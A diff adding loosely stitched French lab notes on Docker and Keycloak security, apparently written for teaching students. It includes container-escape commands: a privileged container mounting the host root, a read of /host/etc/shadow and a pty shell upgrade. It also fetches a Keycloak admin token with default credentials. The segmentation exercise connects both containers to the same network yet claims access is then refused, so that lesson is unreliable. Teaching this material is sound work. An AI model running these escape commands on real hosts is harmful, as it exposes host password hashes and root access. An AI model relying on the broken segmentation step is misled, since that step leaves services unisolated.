@@ -1,0 +1,74 @@
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+docker run -d -v /:/host --name escape --privileged --cap-add=ALL --pid=host --userns=host ubuntu sleep 3600
+cat /host/etc/*release
+cat /host/etc/shadow
+
+Sur l'hôte :
+sudo echo 'H@CKED !!!' > /root/flag
+
+Dans le conteneur : 
+cat /host/root/flag
+
+sudo docker run -p 8080:8080 -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak:22.0.5 start-dev
+
+curl -X POST http://localhost:8080/realms/master/protocol/openid-connect/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'client_id=admin-cli&username=admin&password=admin&grant_type=password'
+
+curl -X GET \
+  'http://localhost:8080/admin/realms/master/users' \ 
+  -H 'Authorization: Bearer ACCESS_TOKEN' \
+
+Conteneur Docker Keycloak :
+Lancez un conteneur Docker Keycloak pour représenter un service d'authentification sensible.
+
+bash
+Copy code
+docker run -d --name keycloak-server -p 8080:8080 jboss/keycloak:latest
+Conteneur Compromis :
+Créez un conteneur compromis (par exemple, à partir de l'image owasp/zap2docker-stable) pour simuler un conteneur vulnérable.
+
+bash
+Copy code
+docker run -it --name conteneur-compromis owasp/zap2docker-stable
+2. Test initial d'accès depuis le conteneur compromis :
+À partir du conteneur compromis, tentez d'accéder au service Keycloak :
+
+bash
+Copy code
+docker exec -it conteneur-compromis bash
+# À l'intérieur du conteneur compromis
+curl http://keycloak-server:8080
+Expliquez aux étudiants que l'accès est réussi en raison de l'absence de segmentation réseau.
+
+3. Configuration de la segmentation réseau :
+Créez un réseau Docker distinct pour isoler le conteneur Keycloak :
+
+bash
+Copy code
+docker network create --driver bridge secure-network
+docker network connect secure-network keycloak-server
+docker network connect secure-network conteneur-compromis
+Déconnectez les conteneurs du réseau par défaut pour les isoler davantage :
+
+bash
+Copy code
+docker network disconnect bridge keycloak-server
+docker network disconnect bridge conteneur-compromis
+4. Vérification de l'efficacité de la segmentation réseau :
+Depuis le conteneur compromis, réessayez d'accéder au service Keycloak :
+
+bash
+Copy code
+docker exec -it conteneur-compromis bash
+# À l'intérieur du conteneur compromis
+curl http://keycloak-server:8080
+Expliquez que cette fois-ci, l'accès est refusé grâce à la segmentation réseau, montrant ainsi la protection apportée par cette configuration.
+
+sudo iptables -I DOCKER-USER -p tcp -s 172.19.0.3 -d 10.0.2.15/24 --dport 8080 -j DROP
+sudo iptables -I INPUT -p tcp -s 172.18.0.3 -d 10.0.2.15 --dport 8080 -j DROP
+
+sudo docker inspect dazzling_varahamihira -f "{{json .NetworkSettings.Networks }}"
+
+Initialement, les dockers ne sont pas dans le même réseau -> pas de communication entre eux.
+Par défaut, les conteneurs sont lancés dans le réseau par défaut, "bridge".
+Si ils le sont, ils peuvent communiquer, dangereux.
+
